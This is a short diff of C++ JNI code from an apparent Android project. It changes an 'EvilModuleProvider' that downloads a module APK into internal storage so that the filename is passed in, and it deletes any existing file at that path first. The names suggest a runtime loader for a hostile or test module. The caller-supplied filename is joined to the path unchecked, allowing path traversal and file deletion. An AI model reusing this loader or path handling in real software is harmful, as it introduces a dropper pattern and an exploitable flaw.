@@ -24,10 +24,12 @@ std::string EvilModuleProvider::provideEvilModuleFilePath() throw(NoSuchFileExce
     return filePath;
 }
 
-std::string EvilModuleProvider::downloadEvilModule(JNIEnv *env) throw(DownloadException) {
+std::string EvilModuleProvider::downloadEvilModule(JNIEnv *env, const char* fileName) throw(DownloadException) {
     fileDownloaded = false;
     string internalStorage = util::getInternalStorageDir(env);
-    string filePath = internalStorage + "/EvilModule.apk";
+    string filePath = internalStorage + "/" + fileName;
+
+    std::remove(filePath.c_str());
 
 
     try{
